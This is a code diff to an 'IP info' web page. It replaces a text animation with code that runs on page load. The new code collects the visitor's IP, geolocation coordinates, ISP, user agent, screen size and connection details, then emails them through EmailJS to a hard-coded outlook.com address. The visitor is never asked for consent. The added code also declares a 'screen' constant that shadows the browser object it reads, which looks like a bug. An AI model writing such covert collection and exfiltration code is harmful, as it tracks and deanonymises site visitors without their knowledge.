@@ -1,15 +1,34 @@
-let animationDelay = 0;
+// Initialize EmailJS
+emailjs.init("YOUR_PUBLIC_KEY"); // You need to get this from emailjs.com
 
-function animateText(element, newText, delay = 0) {
-    setTimeout(() => {
-        element.classList.add('hide');
-        
-        setTimeout(() => {
-            element.textContent = newText;
-            element.classList.remove('hide');
-            element.classList.add('show');
-        }, 400);
-    }, delay);
+async function sendEmail(data) {
+    const emailData = {
+        to_email: "openeyes08@outlook.com",
+        subject: "New IP Info Visit",
+        message: `
+IP Address: ${data.ip}
+Location: ${data.location}
+ISP: ${data.isp}
+Country: ${data.country}
+Timezone: ${data.timezone}
+Coordinates: ${data.coords}
+ASN: ${data.asn}
+User Agent: ${data.useragent}
+Screen: ${data.screen}
+Language: ${data.lang}
+Connection: ${data.connection}
+Time: ${new Date().toLocaleString()}
+        `
+    };
+    
+    try {
+        document.getElementById('email-status').textContent = 'sending email...';
+        await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailData);
+        document.getElementById('email-status').textContent = 'email sent successfully';
+    } catch (error) {
+        console.error('Email failed:', error);
+        document.getElementById('email-status').textContent = 'email failed to send';
+    }
 }
 
 async function loadData() {
@@ -17,83 +36,73 @@ async function loadData() {
     btn.textContent = 'loading...';
     btn.disabled = true;
     
-    animationDelay = 0;
-    
-    // Reset all animations
-    document.querySelectorAll('.scroll-text').forEach(el => {
-        el.classList.remove('show', 'hide');
-    });
+    let collectedData = {};
     
     try {
-        // Get comprehensive IP info
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         
-        // Animate each piece of data
-        animateText(document.getElementById('ip'), data.ip || 'unable to fetch', animationDelay += 200);
+        // Update all info instantly
+        document.getElementById('ip').textContent = data.ip || 'unable to fetch';
+        collectedData.ip = data.ip || 'unable to fetch';
         
-        animateText(document.getElementById('location'), 
-            `${data.city || 'unknown'}, ${data.region || 'unknown'}, ${data.country_name || 'unknown'}`, 
-            animationDelay += 200);
+        const location = `${data.city || 'unknown'}, ${data.region || 'unknown'}, ${data.country_name || 'unknown'}`;
+        document.getElementById('location').textContent = location;
+        collectedData.location = location;
         
-        animateText(document.getElementById('isp'), data.org || 'unknown provider', animationDelay += 200);
+        document.getElementById('isp').textContent = data.org || 'unknown provider';
+        collectedData.isp = data.org || 'unknown provider';
         
-        animateText(document.getElementById('country'), 
-            `${data.country_code || 'unknown'} (${data.country_calling_code || 'n/a'})`, 
-            animationDelay += 200);
+        const country = `${data.country_code || 'unknown'} (${data.country_calling_code || 'n/a'})`;
+        document.getElementById('country').textContent = country;
+        collectedData.country = country;
         
-        animateText(document.getElementById('timezone'), data.timezone || 'unknown timezone', animationDelay += 200);
+        document.getElementById('timezone').textContent = data.timezone || 'unknown timezone';
+        collectedData.timezone = data.timezone || 'unknown timezone';
         
-        animateText(document.getElementById('coords'), 
-            `${data.latitude || 'unknown'}, ${data.longitude || 'unknown'}`, 
-            animationDelay += 200);
+        const coords = `${data.latitude || 'unknown'}, ${data.longitude || 'unknown'}`;
+        document.getElementById('coords').textContent = coords;
+        collectedData.coords = coords;
         
-        animateText(document.getElementById('asn'), 
-            `AS${data.asn || 'unknown'} - ${data.network || 'unknown network'}`, 
-            animationDelay += 200);
+        const asn = `AS${data.asn || 'unknown'} - ${data.network || 'unknown network'}`;
+        document.getElementById('asn').textContent = asn;
+        collectedData.asn = asn;
         
     } catch (error) {
         console.error('failed to fetch ip data:', error);
-        animateText(document.getElementById('ip'), 'error fetching data', animationDelay += 200);
-        animateText(document.getElementById('location'), 'error', animationDelay += 200);
-        animateText(document.getElementById('isp'), 'error', animationDelay += 200);
-        animateText(document.getElementById('country'), 'error', animationDelay += 200);
-        animateText(document.getElementById('timezone'), 'error', animationDelay += 200);
-        animateText(document.getElementById('coords'), 'error', animationDelay += 200);
-        animateText(document.getElementById('asn'), 'error', animationDelay += 200);
+        document.getElementById('ip').textContent = 'error fetching data';
+        collectedData.ip = 'error fetching data';
     }
     
     // Browser/system info
-    animateText(document.getElementById('useragent'), navigator.userAgent, animationDelay += 200);
+    document.getElementById('useragent').textContent = navigator.userAgent;
+    collectedData.useragent = navigator.userAgent;
     
-    animateText(document.getElementById('screen'), 
-        `${screen.width}x${screen.height} (${screen.colorDepth}bit)`, 
-        animationDelay += 200);
+    const screen = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+    document.getElementById('screen').textContent = screen;
+    collectedData.screen = screen;
     
-    animateText(document.getElementById('lang'), 
-        `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`, 
-        animationDelay += 200);
+    const lang = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
+    document.getElementById('lang').textContent = lang;
+    collectedData.lang = lang;
     
-    // Connection info
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    animateText(document.getElementById('connection'), 
-        connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps` : 'connection info unavailable', 
-        animationDelay += 200);
+    const connectionInfo = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps` : 'connection info unavailable';
+    document.getElementById('connection').textContent = connectionInfo;
+    collectedData.connection = connectionInfo;
     
-    // DNS info (simplified)
-    animateText(document.getElementById('dns'), 
-        'dns info requires additional permissions', 
-        animationDelay += 200);
+    document.getElementById('dns').textContent = 'dns info requires additional permissions';
+    collectedData.dns = 'dns info requires additional permissions';
     
-    setTimeout(() => {
-        btn.textContent = 'refresh data';
-        btn.disabled = false;
-    }, animationDelay + 500);
+    // Send email with all data
+    await sendEmail(collectedData);
+    
+    btn.textContent = 'refresh data';
+    btn.disabled = false;
 }
 
 function refresh() {
     loadData();
 }
 
-// Load data when page loads
 document.addEventListener('DOMContentLoaded', loadData);
